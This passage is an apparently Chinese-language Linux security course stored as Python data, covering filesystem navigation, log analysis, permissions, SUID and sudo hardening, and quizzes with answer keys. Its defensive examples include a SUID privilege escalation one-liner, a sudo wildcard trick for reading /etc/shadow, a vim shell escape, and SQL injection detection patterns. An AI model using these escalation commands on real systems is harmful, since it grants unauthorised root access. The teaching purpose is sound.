# -*- coding: utf-8 -*-
"""路線 3：Linux 系統與加固（CompTIA Linux+ XK0-005）"""

CH = []

CH.append({
    "id": "l01",
    "title": "Linux 檔案系統與基本導覽",
    "subtitle": "目錄結構、路徑、檔案操作、文字處理三劍客",
    "level": "入門",
    "minutes": 24,
    "summary": "資安工具幾乎都跑在 Linux 上，伺服器也大多是 Linux。會在終端機裡移動與找東西，是所有後續技能的前提。",
    "why": "Windows 用**滑鼠指**，Linux 用**嘴巴講**。一開始比較慢，但當你要在 500 台機器上"
           "「找出所有最近三天被修改過的設定檔」時，滑鼠完全做不到，一行指令三秒解決。"
           "**Linux 的學習曲線是前面陡、後面極平。**",
    "sections": [
        {
            "heading": "目錄結構：每個資料夾都有固定用途",
            "body": "Linux 只有**一個根目錄 `/`**（不像 Windows 有 C: D: E:）。"
                    "所有東西都掛在它底下。\n\n"
                    "**資安人員最常碰的目錄**：\n"
                    "- `/etc` — **所有設定檔**。查任何服務的組態都來這裡。\n"
                    "- `/var/log` — **所有日誌**。調查事件的第一站。\n"
                    "- `/home` — 使用者家目錄。使用者的檔案與設定。\n"
                    "- `/root` — root 的家目錄（注意：不是 `/`）。\n"
                    "- `/tmp` 與 `/dev/shm` — 臨時目錄，**任何人都可寫入 → 惡意程式最愛的落腳處**。\n"
                    "- `/bin` `/sbin` `/usr/bin` `/usr/sbin` — 可執行程式。\n"
                    "- `/proc` — 虛擬檔案系統，反映**核心與程序的即時狀態**（不是真的檔案）。\n"
                    "- `/dev` — 裝置檔案。\n"
                    "- `/opt` `/srv` — 第三方軟體與服務資料。\n\n"
                    "**絕對路徑 vs 相對路徑**：\n"
                    "- 絕對路徑從 `/` 開始：`/var/log/auth.log`（在任何地方都指同一個檔案）\n"
                    "- 相對路徑從目前位置算：`../log/auth.log`\n"
                    "- `.` = 目前目錄、`..` = 上一層、`~` = 自己的家目錄",
            "example": "**為什麼 `/tmp` 是資安重點**：\n\n"
                       "`/tmp` 權限是 `1777`（所有人可讀寫，但有 sticky bit 防止互刪）。"
                       "這代表**任何低權限帳號都能在這裡放檔案並執行**。\n\n"
                       "所以入侵調查時一定要看：\n"
                       "```\n"
                       "ls -lat /tmp /dev/shm /var/tmp\n"
                       "```\n"
                       "尋找：奇怪的檔名（`.x`、`kdevtmpfsi`、隨機字串）、"
                       "最近建立的可執行檔、隱藏檔（以 `.` 開頭）。\n\n"
                       "**加固做法**：把 `/tmp` 掛載成 `noexec,nosuid,nodev`，"
                       "讓放在那裡的東西**根本無法執行**。",
            "note": "考點：FHS（檔案系統階層標準）規定這些目錄用途。"
                    "考試會問「設定檔應該放哪」→ `/etc`；「日誌放哪」→ `/var/log`。",
        },
        {
            "heading": "必會的十五個指令",
            "body": "**移動與查看**：\n"
                    "- `pwd` 我在哪　`cd` 切換目錄　`ls -la` 列出全部（含隱藏檔）與權限\n"
                    "- `cat` 印出檔案　`less` 分頁瀏覽（**大檔案用這個，不要用 cat**）\n"
                    "- `head -n 20` 前 20 行　`tail -f` **持續追蹤新增內容**（看日誌必用）\n\n"
                    "**找東西（資安最重要）**：\n"
                    "- `find` 依條件找檔案 — 名稱、時間、權限、大小、擁有者\n"
                    "- `grep` 在檔案內容裡找字串\n"
                    "- `which` / `whereis` 找指令在哪\n\n"
                    "**操作**：\n"
                    "- `cp` 複製　`mv` 移動／改名　`rm` 刪除（**`rm -rf` 沒有回收桶**）\n"
                    "- `mkdir -p` 建立多層目錄　`ln -s` 建立符號連結\n\n"
                    "**其他**：\n"
                    "- `df -h` 磁碟使用量　`du -sh *` 各目錄大小　`wc -l` 算行數\n"
                    "- `history` 指令歷史（**調查時的重要證據**）",
            "example": "**管道 (Pipe) 與重導向：Linux 的真正威力**\n\n"
                       "`|` 把左邊的輸出送給右邊當輸入，可以無限串接：\n"
                       "```\n"
                       "# 找出登入失敗次數最多的前 5 個來源 IP\n"
                       "grep 'Failed password' /var/log/auth.log \\\n"
                       "  | grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' \\\n"
                       "  | sort | uniq -c | sort -rn | head -5\n"
                       "```\n"
                       "拆解：找出失敗紀錄 → 只取 IP → 排序 → 計次 → 依次數倒排 → 取前五。\n\n"
                       "**這一行就是最小可用的入侵偵測。**\n\n"
                       "重導向：`>` 覆寫檔案、`>>` 附加、`2>` 只導錯誤、"
                       "`&>` 全部導出、`2>/dev/null` 丟掉錯誤訊息。",
            "note": "`sort | uniq -c | sort -rn` 這個組合叫「計次排行」，"
                    "是日誌分析最常用的三連招。**背下來會用一輩子。**",
        },
        {
            "heading": "文字處理三劍客：grep / sed / awk",
            "body": "**`grep` — 找出符合的行**\n"
                    "```\n"
                    "grep -i error app.log         # 忽略大小寫\n"
                    "grep -r 'password' /etc/      # 遞迴搜尋整個目錄\n"
                    "grep -v '^#' config.conf      # 反向：排除註解行\n"
                    "grep -c 'Failed' auth.log     # 只算數量\n"
                    "grep -n 'root' /etc/passwd    # 顯示行號\n"
                    "grep -E '(GET|POST) /admin'   # 用正規表達式\n"
                    "grep -A3 -B3 'panic' sys.log  # 顯示前後三行（看上下文）\n"
                    "```\n\n"
                    "**`awk` — 依欄位處理**\n"
                    "```\n"
                    "awk '{print $1}' access.log            # 印第一欄（來源 IP）\n"
                    "awk -F: '{print $1, $7}' /etc/passwd   # 用冒號分隔，印帳號與 shell\n"
                    "awk '$9 >= 400 {print $7}' access.log  # 狀態碼 >=400 的網址\n"
                    "awk '{s+=$10} END {print s}' access.log # 加總流量\n"
                    "```\n\n"
                    "**`sed` — 取代與編輯**\n"
                    "```\n"
                    "sed 's/old/new/g' file            # 全部取代（只輸出不改檔）\n"
                    "sed -i.bak 's/yes/no/' sshd_config # 直接改檔並備份\n"
                    "sed -n '10,20p' file              # 只印第 10–20 行\n"
                    "sed '/^$/d' file                  # 刪除空行\n"
                    "```",
            "example": "**實戰：分析網頁伺服器日誌找出攻擊**\n"
                       "```\n"
                       "# 1. 哪些 IP 請求量最大？（找掃描器或 DDoS）\n"
                       "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head\n\n"
                       "# 2. 有人在嘗試存取管理後台嗎？\n"
                       "grep -E '/(admin|wp-login|phpmyadmin|\\.env|\\.git)' access.log\n\n"
                       "# 3. 大量 404 的來源 = 正在猜路徑\n"
                       "awk '$9==404 {print $1}' access.log | sort | uniq -c | sort -rn | head\n\n"
                       "# 4. 有人成功登入後台嗎？（200 才是真的成功）\n"
                       "awk '$7 ~ /admin/ && $9==200 {print $1, $4, $7}' access.log\n\n"
                       "# 5. 找出 SQL Injection 的嘗試特徵\n"
                       "grep -iE \"union.*select|' or |--|sleep\\(|benchmark\\(\" access.log\n"
                       "```\n\n"
                       "**這五條指令就是一份基本的 Web 攻擊調查報告。**",
            "note": "正規表達式最低限度要會：`^` 行首、`$` 行尾、`.` 任一字元、"
                    "`*` 零或多次、`+` 一或多次、`[0-9]` 數字、`\\.` 真正的點、"
                    "`(a|b)` a 或 b。這些足以應付九成場景。",
        },
        {
            "heading": "找檔案：find 的資安用法",
            "body": "`find` 是入侵調查最有力的單一工具。\n\n"
                    "**基本語法**：`find <哪裡> <條件> <動作>`\n\n"
                    "**資安必背的六種用法**：\n"
                    "```\n"
                    "# 1. 找出所有 SUID 檔案（可能的權限提升途徑）\n"
                    "find / -perm -4000 -type f 2>/dev/null\n\n"
                    "# 2. 找出任何人都可寫的檔案（設定檔被改的風險）\n"
                    "find /etc -perm -002 -type f 2>/dev/null\n\n"
                    "# 3. 找出最近 24 小時內被修改的檔案（入侵痕跡）\n"
                    "find /etc /usr/bin /usr/sbin -mtime -1 -type f\n\n"
                    "# 4. 找出沒有主人的檔案（帳號被刪但檔案留著）\n"
                    "find / -nouser -o -nogroup 2>/dev/null\n\n"
                    "# 5. 找出隱藏的可執行檔在臨時目錄\n"
                    "find /tmp /var/tmp /dev/shm -name '.*' -type f 2>/dev/null\n\n"
                    "# 6. 找大檔案（可能是待外傳的壓縮打包資料）\n"
                    "find /home -size +100M -type f -exec ls -lh {} \\;\n"
                    "```",
            "example": "**為什麼 SUID 這麼重要**：\n\n"
                       "SUID 是一個特殊權限位，代表「**執行這個程式時，用檔案擁有者的身分跑**」。"
                       "例如 `/usr/bin/passwd` 是 root 擁有且有 SUID，"
                       "所以一般使用者才能改自己的密碼（因為要寫入 `/etc/shadow`）。\n\n"
                       "**問題**：如果一個不該有 SUID 的程式被設了 SUID，"
                       "而它又能執行任意指令（例如 `find`、`vim`、`python`），"
                       "**攻擊者就能藉此變成 root**。\n\n"
                       "所以入侵後的第一件事常常是：\n"
                       "```\n"
                       "find / -perm -4000 -type f 2>/dev/null\n"
                       "```\n"
                       "然後比對「這台機器應該有的 SUID 清單」。"
                       "**多出來的就是後門。**\n\n"
                       "**加固**：定期比對 SUID 清單基準，移除不必要的 SUID 位。",
            "note": "`2>/dev/null` 的作用是把「權限不足」的錯誤訊息丟掉，"
                    "讓輸出乾淨。這在 find 全系統時幾乎必加。",
        },
    ],
    "labs": [{
        "title": "十分鐘熟悉 Linux 導覽與搜尋",
        "goal": "把最重要的指令跑一遍，建立手感。",
        "warn": "全部是唯讀查詢，安全。建議在虛擬機或 WSL 中練習。",
        "steps": [
            {"cmd": "ls -la /etc | head -12",
             "explain": "看設定檔目錄。第一欄是權限，第三、四欄是擁有者與群組。",
             "output": "total 812\ndrwxr-xr-x 128 root root  12288 May 12 09:02 .\ndrwxr-xr-x  20 root root   4096 Apr 18 11:41 ..\n-rw-r--r--   1 root root   3040 Jan 15 08:22 adduser.conf\ndrwxr-xr-x   2 root root   4096 May 10 14:33 apt\n-rw-r--r--   1 root root   1748 Feb 03 10:15 crontab\n-rw-r--r--   1 root root   2932 May 12 09:02 group\n-rw-r-----   1 root shadow  1461 May 12 09:02 gshadow\n-rw-r--r--   1 root root   2181 May 12 09:02 passwd\n-rw-r-----   1 root shadow  1284 May 12 09:02 shadow\ndrwxr-xr-x   4 root root   4096 Apr 20 16:08 ssh\n-rw-r--r--   1 root root    668 Jan 15 08:22 sudo.conf\ndrwxr-xr-x   2 root root   4096 Mar 22 09:44 sysctl.d"},
            {"cmd": "ls -lat /tmp /dev/shm /var/tmp",
             "explain": "**入侵調查第一站**：檢查所有人可寫的臨時目錄有沒有可疑檔案。",
             "output": "/tmp:\ntotal 2864\ndrwxrwxrwt 12 root  root     4096 May 12 10:41 .\n-rwxr-xr-x  1 www-data www-data 2891264 May 12 10:38 .kdevtmpfsi\n-rw-r--r--  1 www-data www-data     142 May 12 10:38 .cron.tmp\ndrwxrwxrwt  2 root  root     4096 May 12 08:00 systemd-private-xxx\n\n/dev/shm:\ntotal 0\ndrwxrwxrwt 2 root root 40 May 12 08:00 .\n\n/var/tmp:\ntotal 8\ndrwxrwxrwt 3 root root 4096 May 11 03:11 .\n# 高度警訊：.kdevtmpfsi 是知名的挖礦程式名稱，且屬於 www-data\n# → 代表網站服務被入侵後植入"},
            {"cmd": "grep 'Failed password' /var/log/auth.log | grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' | sort | uniq -c | sort -rn | head -5",
             "explain": "**計次排行三連招**：找出登入失敗最多的來源 IP。這是最小可用的入侵偵測。",
             "output": "   4821 203.0.113.9\n    913 198.51.100.44\n    277 192.0.2.117\n     12 10.10.10.88\n      3 10.10.10.5\n# 前三個是外部 IP 且次數極高 → 正在被暴力破解，應立即封鎖並改用金鑰登入"},
            {"cmd": "find / -perm -4000 -type f 2>/dev/null",
             "explain": "**列出所有 SUID 檔案**。與已知基準比對，多出來的可能是後門。",
             "output": "/usr/bin/su\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/umount\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/find\n# 警訊：/usr/bin/find 正常情況下不該有 SUID → 可用來提權成 root，疑似後門"},
            {"cmd": "find /etc -mtime -1 -type f 2>/dev/null",
             "explain": "找出 24 小時內被修改的設定檔。入侵者常改 sshd_config、crontab、passwd。",
             "output": "/etc/passwd\n/etc/shadow\n/etc/ssh/sshd_config\n/etc/crontab\n# 如果今天沒有變更作業，這四個同時被改 = 幾乎確定被入侵"},
            {"cmd": "awk -F: '$3 == 0 {print $1, $3, $7}' /etc/passwd",
             "explain": "**找出所有 UID 為 0 的帳號**（UID 0 = root 權限）。"
                        "正常情況只應該有一個 root。",
             "output": "root 0 /bin/bash\nbackupsvc 0 /bin/bash\n# 警訊：backupsvc 的 UID 是 0 → 這是一個隱藏的 root 後門帳號"},
            {"cmd": "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -5",
             "explain": "分析網頁日誌：哪些 IP 請求量異常大。",
             "output": "  28104 203.0.113.9\n   1922 66.249.66.1\n    884 10.10.10.5\n    412 198.51.100.44\n    301 172.217.160.1\n# 第一名遠高於其他 → 掃描器或 DDoS，需查 User-Agent 與請求路徑"},
        ],
    }],
    "quiz": [
        {"q": "Linux 上所有設定檔慣例放在哪個目錄？",
         "options": ["/var", "/etc", "/opt", "/usr/local"],
         "answer": 1,
         "why": "FHS 規定 /etc 存放系統與服務的設定檔。日誌則在 /var/log。"},
        {"q": "調查入侵時，為什麼要特別檢查 /tmp、/var/tmp、/dev/shm？",
         "options": ["這些目錄空間最大", "它們對所有使用者可寫，是低權限惡意程式最常見的落腳處",
                     "系統啟動會執行裡面的檔案", "它們不會被記錄"],
         "answer": 1,
         "why": "權限 1777 讓任何帳號都能寫入並執行。加固方式是掛載成 noexec,nosuid,nodev。"},
        {"q": "`sort | uniq -c | sort -rn` 這個組合的作用是？",
         "options": ["刪除重複行", "計算每個項目出現次數並依次數由多到少排序",
                     "依字母排序", "只顯示唯一值"],
         "answer": 1,
         "why": "先排序讓相同的相鄰、uniq -c 計次、再依數字倒排。日誌分析最常用的三連招。"},
        {"q": "SUID 權限的作用是什麼？為什麼是資安重點？",
         "options": ["讓檔案唯讀；防止篡改",
                     "執行時使用檔案擁有者的身分；若設在可執行任意指令的程式上，可被用來提權成 root",
                     "隱藏檔案；躲避掃描", "壓縮檔案；節省空間"],
         "answer": 1,
         "why": "例如 /usr/bin/find 若有 SUID 且屬 root，攻擊者可用 find 的 -exec 執行任意指令成為 root。"},
        {"q": "`grep -v '^#' config.conf` 的作用是？",
         "options": ["只顯示註解行", "排除以 # 開頭的註解行，只看實際設定",
                     "計算註解數量", "刪除註解行並存檔"],
         "answer": 1,
         "why": "-v 是反向選取，^# 是「行首為 #」。這是快速看懂設定檔的常用技巧。"},
        {"q": "`awk -F: '$3 == 0 {print $1}' /etc/passwd` 在找什麼？",
         "options": ["沒有密碼的帳號", "UID 為 0（即具備 root 權限）的所有帳號",
                     "shell 為 nologin 的帳號", "最近建立的帳號"],
         "answer": 1,
         "why": "/etc/passwd 第三欄是 UID，0 代表 root 權限。正常系統只應有一個 root，"
                "多出來的就是後門帳號。"},
        {"q": "`2>/dev/null` 的意思是？",
         "options": ["把輸出存到檔案", "把錯誤訊息（stderr）丟棄，讓輸出保持乾淨",
                     "在背景執行", "以 root 身分執行"],
         "answer": 1,
         "why": "檔案描述元 2 是 stderr，/dev/null 是黑洞。find 掃全系統時幾乎必加。"},
        {"q": "查看正在持續寫入的日誌檔，最適合用哪個指令？",
         "options": ["cat", "head", "tail -f", "wc -l"],
         "answer": 2,
         "why": "tail -f 會持續追蹤新增內容。cat 大檔案會塞滿畫面且不會追新。"},
    ],
    "keywords": ["Linux", "FHS", "/etc", "/var/log", "/tmp", "grep", "awk", "sed",
                 "find", "SUID", "管道", "重導向", "正規表達式"],
    "takeaway": [
        "設定檔在 /etc、日誌在 /var/log、可寫臨時目錄是惡意程式最愛的落腳處。",
        "`sort | uniq -c | sort -rn` 是日誌分析的三連招，背下來用一輩子。",
        "`find / -perm -4000` 找 SUID 是入侵調查與提權檢查的必備動作。",
    ],
})

CH.append({
    "id": "l02",
    "title": "使用者、群組與檔案權限",
    "subtitle": "UID/GID、rwx 數字權限、特殊權限、ACL、sudo",
    "level": "入門",
    "minutes": 26,
    "summary": "Linux 的權限模型是三組 rwx。看得懂 `-rw-r-----` 這串符號，你就掌握了最小權限原則的實作工具。",
    "why": "把權限想成**辦公室的鑰匙**：檔案的擁有者（我）、同組同事（我的部門）、"
           "其他人（別的部門）各有一把不同的鑰匙。"
           "**每一把鑰匙可以開三個功能：讀（看）、寫（改）、執行（用）。**"
           "所有 Linux 加固工作，本質上都是在調整這九個開關。",
    "sections": [
        {
            "heading": "讀懂 `ls -l` 的權限字串",
            "body": "```\n"
                    "-rw-r-----  1 root shadow  1284 May 12 09:02 /etc/shadow\n"
                    "│└┬┘└┬┘└┬┘    └─┬─┘ └──┬─┘\n"
                    "│ │  │  │       │      └── 群組\n"
                    "│ │  │  │       └───────── 擁有者\n"
                    "│ │  │  └── 其他人 (other) 的權限\n"
                    "│ │  └───── 群組 (group) 的權限\n"
                    "│ └──────── 擁有者 (user) 的權限\n"
                    "└────────── 檔案類型\n"
                    "```\n\n"
                    "**第一個字元 = 類型**：\n"
                    "`-` 一般檔案　`d` 目錄　`l` 符號連結　`b`/`c` 裝置　`s` socket　`p` 管道\n\n"
                    "**接下來九個字元 = 三組 rwx**：\n"
                    "- `r` = read 讀（4）\n"
                    "- `w` = write 寫（2）\n"
                    "- `x` = execute 執行（1）\n"
                    "- `-` = 沒有這個權限（0）\n\n"
                    "所以 `rw-r-----` 拆開：擁有者 `rw-` = 4+2 = **6**、"
                    "群組 `r--` = **4**、其他人 `---` = **0** → **640**。",
            "example": "**權限數字換算練習**（考試必考）：\n"
                       "```\n"
                       "rwxrwxrwx = 777  所有人都能讀寫執行 → 幾乎永遠是錯的\n"
                       "rwxr-xr-x = 755  程式與目錄的標準權限\n"
                       "rw-r--r-- = 644  一般文件的標準權限\n"
                       "rw-r----- = 640  設定檔（同組可讀，其他人看不到）\n"
                       "rw------- = 600  私密檔案（SSH 私鑰必須是這個）\n"
                       "r-------- = 400  唯讀私密檔\n"
                       "rwx------ = 700  只有自己能進的目錄\n"
                       "```\n\n"
                       "**目錄的權限意義不同**（很重要的觀念）：\n"
                       "- `r` = 可以 `ls` 列出裡面有什麼\n"
                       "- `w` = 可以在裡面**新增或刪除**檔案\n"
                       "- `x` = 可以 `cd` 進去、可以存取裡面的檔案\n\n"
                       "**所以目錄只有 `r` 沒有 `x`，你能看到檔名但打不開檔案。**",
            "note": "**最常見的資安錯誤**：`chmod 777`。"
                    "很多人遇到權限問題就下 777，這等於把門拆掉。"
                    "正確做法是找出「誰需要什麼權限」，然後只給那個。",
        },
        {
            "heading": "chmod / chown 與 umask",
            "body": "**`chmod` 改權限**，兩種寫法：\n"
                    "```\n"
                    "# 數字法（推薦，明確）\n"
                    "chmod 640 config.conf\n"
                    "chmod -R 755 /var/www/html      # -R 遞迴套用\n\n"
                    "# 符號法（適合微調）\n"
                    "chmod u+x script.sh            # 給擁有者加執行權\n"
                    "chmod go-w file                # 拿掉群組與其他人的寫入權\n"
                    "chmod o= secret.txt            # 其他人完全沒有權限\n"
                    "chmod a+r public.txt           # 所有人可讀\n"
                    "```\n\n"
                    "**`chown` 改擁有者**：\n"
                    "```\n"
                    "chown alice file               # 改擁有者\n"
                    "chown alice:developers file    # 同時改擁有者與群組\n"
                    "chgrp developers file          # 只改群組\n"
                    "```\n\n"
                    "**`umask` 決定新建檔案的預設權限**：\n"
                    "- 它是「要拿掉的權限」，用減法\n"
                    "- 檔案預設基底 666、目錄預設基底 777\n"
                    "- `umask 022` → 檔案 644、目錄 755（**一般預設**）\n"
                    "- `umask 027` → 檔案 640、目錄 750（**較安全，其他人完全看不到**）\n"
                    "- `umask 077` → 檔案 600、目錄 700（**最嚴格**）",
            "example": "**加固實例：SSH 金鑰的權限要求**\n\n"
                       "SSH 有一個「太寬鬆就拒絕使用」的保護機制：\n"
                       "```\n"
                       "$ ssh -i ~/.ssh/id_rsa server\n"
                       "Permissions 0644 for '/home/tom/.ssh/id_rsa' are too open.\n"
                       "It is required that your private key files are NOT accessible by others.\n"
                       "This private key will be ignored.\n"
                       "```\n"
                       "**正確權限**：\n"
                       "```\n"
                       "chmod 700 ~/.ssh            # 目錄只有自己能進\n"
                       "chmod 600 ~/.ssh/id_rsa     # 私鑰只有自己能讀寫\n"
                       "chmod 644 ~/.ssh/id_rsa.pub # 公鑰可以公開\n"
                       "chmod 600 ~/.ssh/authorized_keys\n"
                       "```\n\n"
                       "**這個設計值得學習**：與其相信使用者會設對，"
                       "程式自己檢查並拒絕不安全的設定。這叫**安全預設 (Secure by Default)**。",
            "note": "企業加固建議把 `/etc/profile` 或 `/etc/login.defs` 的 UMASK 改成 027，"
                    "讓新建檔案預設就不給「其他人」任何權限。",
        },
        {
            "heading": "三個特殊權限：SUID、SGID、Sticky Bit",
            "body": "在三組 rwx 之外，還有三個特殊位元：\n\n"
                    "**SUID（4000）— 執行時變成檔案擁有者**\n"
                    "- 顯示為擁有者的 x 位置變成 `s`：`-rwsr-xr-x`\n"
                    "- 正當用途：`/usr/bin/passwd`（一般人要改密碼必須寫 `/etc/shadow`）\n"
                    "- **風險：最主要的本機提權途徑**\n\n"
                    "**SGID（2000）— 執行時變成檔案群組；設在目錄上時，"
                    "新建檔案自動繼承該目錄的群組**\n"
                    "- 顯示為群組的 x 變成 `s`：`-rwxr-sr-x` 或 `drwxrwsr-x`\n"
                    "- 正當用途：部門共用資料夾，讓大家建的檔案自動屬於同一群組\n\n"
                    "**Sticky Bit（1000）— 只有檔案擁有者能刪除自己的檔案**\n"
                    "- 顯示為其他人的 x 變成 `t`：`drwxrwxrwt`\n"
                    "- 正當用途：`/tmp`。所有人都能寫，但不能刪別人的檔案\n\n"
                    "設定方式：`chmod 4755 file`（SUID）、`chmod 2775 dir`（SGID）、"
                    "`chmod 1777 dir`（Sticky）。",
            "example": "**SUID 提權的原理（防禦者必須理解）**\n\n"
                       "假設管理員為了方便，給 `/usr/bin/find` 設了 SUID 且擁有者是 root：\n"
                       "```\n"
                       "$ ls -l /usr/bin/find\n"
                       "-rwsr-xr-x 1 root root 320160 /usr/bin/find\n"
                       "```\n"
                       "`find` 有一個 `-exec` 參數可以執行任意指令。"
                       "因為 SUID 讓它以 root 身分執行，所以：\n"
                       "```\n"
                       "$ find . -exec /bin/sh -p \\; -quit\n"
                       "# whoami\n"
                       "root\n"
                       "```\n"
                       "**一般使用者變成 root。**\n\n"
                       "**同類危險的 SUID 程式**：`vim`、`nano`、`python`、`perl`、"
                       "`awk`、`less`、`more`、`tar`、`nmap`（舊版）、`bash`。"
                       "只要程式能「執行別的東西」或「讀寫任意檔案」，加上 SUID 就等於送出 root。\n\n"
                       "**防禦**：\n"
                       "1. 建立 SUID 基準清單，定期比對\n"
                       "2. 用 `chmod u-s` 移除不必要的 SUID\n"
                       "3. 用 AIDE / Tripwire 等檔案完整性監控工具，SUID 一被加上就告警",
            "note": "**GTFOBins** 是一個公開專案，整理了「哪些程式在有 SUID 或 sudo 權限時可被用來提權」。"
                    "防守方應該用它來檢查自己系統上的 SUID 清單與 sudoers 設定。",
        },
        {
            "heading": "sudo：最小權限的實作工具",
            "body": "**為什麼不要直接用 root**：\n"
                    "- 沒有紀錄（不知道是誰做的）\n"
                    "- 一個打錯的指令毀掉整台機器\n"
                    "- 一旦被入侵就是最高權限\n\n"
                    "**sudo 的三個優點**：\n"
                    "1. **有紀錄**：每次提權都寫進 `/var/log/auth.log`\n"
                    "2. **可細分**：可以只允許某些指令\n"
                    "3. **可稽核**：可以錄下完整操作\n\n"
                    "**設定檔 `/etc/sudoers`，一定要用 `visudo` 編輯**"
                    "（它會做語法檢查，避免把自己鎖死）。\n\n"
                    "```\n"
                    "# 語法：使用者  主機=(可切換身分)  可執行指令\n"
                    "\n"
                    "# 完全權限（謹慎使用）\n"
                    "alice   ALL=(ALL:ALL) ALL\n"
                    "\n"
                    "# 只允許重啟 nginx，且不用輸入密碼\n"
                    "deploy  ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx\n"
                    "\n"
                    "# 允許整個群組做備份\n"
                    "%backup ALL=(root) /usr/bin/rsync, /usr/bin/tar\n"
                    "\n"
                    "# 明確禁止危險指令（黑名單，但可被繞過，不可依賴）\n"
                    "operator ALL=(ALL) ALL, !/usr/bin/su, !/bin/bash\n"
                    "```",
            "example": "**sudo 設定的三個常見錯誤**：\n\n"
                       "**錯誤 1：允許可以「跳出去」的程式**\n"
                       "```\n"
                       "user ALL=(root) /usr/bin/vim /etc/hosts\n"
                       "```\n"
                       "看起來只能編輯 hosts，但 vim 裡可以打 `:!/bin/sh` 開出 root shell。\n"
                       "**正解**：改用 `sudoedit` 或專用的 `visudo`-like 工具。\n\n"
                       "**錯誤 2：用萬用字元**\n"
                       "```\n"
                       "user ALL=(root) /bin/cat /var/log/*\n"
                       "```\n"
                       "攻擊者可以 `sudo cat /var/log/../../etc/shadow` 讀走密碼雜湊。\n"
                       "**正解**：明確列出完整路徑，不用 `*`。\n\n"
                       "**錯誤 3：黑名單思維**\n"
                       "```\n"
                       "user ALL=(ALL) ALL, !/bin/su\n"
                       "```\n"
                       "禁了 `su` 但沒禁 `bash`、`python`、`perl`… 永遠列不完。\n"
                       "**正解**：白名單 — 只列出明確允許的少數指令。\n\n"
                       "**進階：啟用 sudo 錄影**\n"
                       "```\n"
                       "Defaults log_output\n"
                       "Defaults!/usr/bin/sudoreplay !log_output\n"
                       "```\n"
                       "之後可用 `sudoreplay -l` 回放每一次提權操作 — 稽核極為有用。",
            "note": "考點：`su` 是「切換成另一個使用者」需要**對方的密碼**；"
                    "`sudo` 是「以另一個身分執行單一指令」需要**自己的密碼**。"
                    "`sudo -i` / `sudo su -` 才是取得完整 root shell。",
        },
        {
            "heading": "帳號檔案與 ACL 進階權限",
            "body": "**三個關鍵檔案**：\n"
                    "- **`/etc/passwd`**（644，所有人可讀）：\n"
                    "  `帳號:x:UID:GID:說明:家目錄:shell`\n"
                    "  第二欄的 `x` 代表密碼存在 shadow。**shell 是 `/sbin/nologin` 代表不能登入**。\n"
                    "- **`/etc/shadow`**（640 或 000，只有 root 可讀）：\n"
                    "  `帳號:密碼雜湊:上次改密碼:最短天數:最長天數:警告:停用:到期`\n"
                    "  雜湊格式 `$6$` = SHA-512、`$y$` = yescrypt、`$2b$` = bcrypt。\n"
                    "  **開頭是 `!` 或 `*` 代表帳號已鎖定或無法用密碼登入。**\n"
                    "- **`/etc/group`**：群組與成員清單。\n\n"
                    "**ACL（存取控制清單）— 當三組 rwx 不夠用時**\n"
                    "情境：一個檔案要讓「擁有者可寫、A 部門可讀、B 使用者可寫、其他人不能看」。"
                    "傳統權限做不到（只有一個群組欄位），這時用 ACL：\n"
                    "```\n"
                    "setfacl -m u:bob:rw report.xlsx        # 給特定使用者\n"
                    "setfacl -m g:audit:r report.xlsx       # 給特定群組\n"
                    "setfacl -m d:u:bob:rw /shared/         # 目錄預設 ACL（新檔繼承）\n"
                    "getfacl report.xlsx                    # 查看\n"
                    "setfacl -x u:bob report.xlsx           # 移除\n"
                    "```\n"
                    "有 ACL 的檔案在 `ls -l` 會顯示一個 `+`：`-rw-rw----+`",
            "example": "**帳號稽核檢查清單**（每季應執行一次）：\n"
                       "```\n"
                       "# 1. 找出所有可以登入的帳號（排除系統帳號）\n"
                       "awk -F: '$7 !~ /(nologin|false)$/ {print $1, $3, $7}' /etc/passwd\n\n"
                       "# 2. 找出 UID 0 的帳號（應該只有 root）\n"
                       "awk -F: '$3==0 {print $1}' /etc/passwd\n\n"
                       "# 3. 找出沒有密碼的帳號（極度危險）\n"
                       "sudo awk -F: '$2==\"\" {print $1 \" 沒有密碼！\"}' /etc/shadow\n\n"
                       "# 4. 找出密碼永不過期的帳號\n"
                       "sudo awk -F: '$5==\"\" || $5==99999 {print $1}' /etc/shadow\n\n"
                       "# 5. 看誰在 sudo 群組裡\n"
                       "getent group sudo wheel\n\n"
                       "# 6. 找出 90 天未登入的帳號（可能是離職未清理）\n"
                       "lastlog -b 90\n"
                       "```\n\n"
                       "**這六條指令構成一份完整的帳號覆核報告。**",
            "note": "**SELinux / AppArmor**：疊在傳統權限之上的 MAC 強制存取控制。"
                    "就算 `chmod 777`，SELinux policy 仍可能拒絕存取。"
                    "遇到「權限明明夠卻被拒絕」，先用 `getenforce` 與"
                    "`ausearch -m avc -ts recent` 檢查 SELinux 是否在阻擋 — "
                    "**不要為了讓程式跑就關掉 SELinux**。",
        },
    ],
    "diagram": """<svg viewBox="0 0 680 320" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Linux 權限字串解析圖">
<text x="340" y="30" text-anchor="middle" fill="#e2e8f0" font-size="15" font-weight="700">讀懂權限字串：-rw-r-----  (640)</text>
<g font-family="monospace" font-size="34">
<text x="120" y="98" fill="#94a3b8">-</text>
<text x="152" y="98" fill="#4ade80">r</text><text x="184" y="98" fill="#4ade80">w</text><text x="216" y="98" fill="#475569">-</text>
<text x="256" y="98" fill="#fbbf24">r</text><text x="288" y="98" fill="#475569">-</text><text x="320" y="98" fill="#475569">-</text>
<text x="360" y="98" fill="#475569">-</text><text x="392" y="98" fill="#475569">-</text><text x="424" y="98" fill="#475569">-</text>
</g>
<line x1="128" y1="112" x2="128" y2="140" stroke="#94a3b8"/><text x="128" y="158" text-anchor="middle" fill="#94a3b8" font-size="12">類型</text>
<text x="128" y="176" text-anchor="middle" fill="#64748b" font-size="11">- 檔案 / d 目錄</text>
<line x1="190" y1="112" x2="190" y2="200" stroke="#4ade80"/><text x="190" y="218" text-anchor="middle" fill="#4ade80" font-size="13" font-weight="700">擁有者 = 6</text>
